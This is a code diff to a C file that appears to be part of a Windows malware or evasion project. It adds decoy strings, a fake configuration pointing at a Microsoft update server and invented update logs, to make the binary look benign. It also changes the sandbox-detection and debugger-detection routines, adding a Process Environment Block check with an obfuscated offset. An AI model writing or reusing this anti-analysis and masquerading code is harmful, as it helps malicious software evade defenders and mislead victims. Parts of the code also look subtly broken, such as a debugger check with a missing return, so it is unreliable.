@@ -3,6 +3,20 @@
 #include "structs.h"
 #include <stdio.h>
 #include <stdlib.h>
+// fake metainfo 
+
+const char* config = "{\n"
+"    \"update_interval\": \"3600\",\n"
+"    \"server\": \"https://update.microsoft.com\",\n"
+"    \"log_level\": \"INFO\"\n"
+"}";
+
+// Dummy logs 
+
+char* logs = "[2024-01-16 14:32:10] System initialized.\n"
+"[2024-01-16 14:33:05] Checking for updates...\n"
+"[2024-01-16 14:34:22] No updates found.\n";
+
 
 
 #define CONTAINING_RECORD(address, type, field) \
@@ -159,34 +173,41 @@ int checkLowCPU() {
     GetSystemInfo(&sysInfo);
 
     if (sysInfo.dwNumberOfProcessors < 2) {
-        myprintf("Detected sandbox: Only %d CPU cores available\n", sysInfo.dwNumberOfProcessors);
+        //myprintf("Detected sandbox: Only %d CPU cores available\n", sysInfo.dwNumberOfProcessors);
         return 1;
     }
     return 0;
 }
 
 // -------------------------------- //// -------------------------------- //// -------------------------------- //
-int isSandboxed() {
-    ULONGLONG uptime = GetTickCount64();
-    if (uptime < 90000) { // Less than 1 minute
-        //myprintf("Detected sandbox: System uptime too low (%llu ms)\n", uptime);
-        return 1;
+//int IsBiengDebugged() {
+//    ULONGLONG uptime = GetTickCount64();
+//    if (uptime < 90000) { // Less than 1 minute
+//        //myprintf("Detected sandbox: System uptime too low (%llu ms)\n", uptime);
+//        return 1;
+//    }
+//    return 0;
+//}
+
+// -------------------------------- //// -------------------------------- //// -------------------------------- //
+
+//BOOL ChekDebug() {
+//    DWORD t1, t2;
+//    t1 = GetTickCount();
+//    OutputDebugStringA("TEST");
+//    t2 = GetTickCount();
+//    return (t2 - t1 > 5); // If debugger is present, delay is longer
+//}
+
+// -------------------------------- //// -------------------------------- //// -------------------------------- //
+
+BOOL ChekDebug() {
+    PPEB pPeb = GetPeb(PEP_OFFSET_FAKE * 0x2);
+    
+    if (pPeb->BeingDebugged != 0) {
+        return FALSE;
     }
-    return 0;
 }
-
-// -------------------------------- //// -------------------------------- //// -------------------------------- //
-
-BOOL CheckDebugTiming() {
-    DWORD t1, t2;
-    t1 = GetTickCount();
-    OutputDebugStringA("TEST");
-    t2 = GetTickCount();
-    return (t2 - t1 > 5); // If debugger is present, delay is longer
-}
-
-// -------------------------------- //// -------------------------------- //// -------------------------------- //
-
 //int IsDebugged() {
 //    
 //
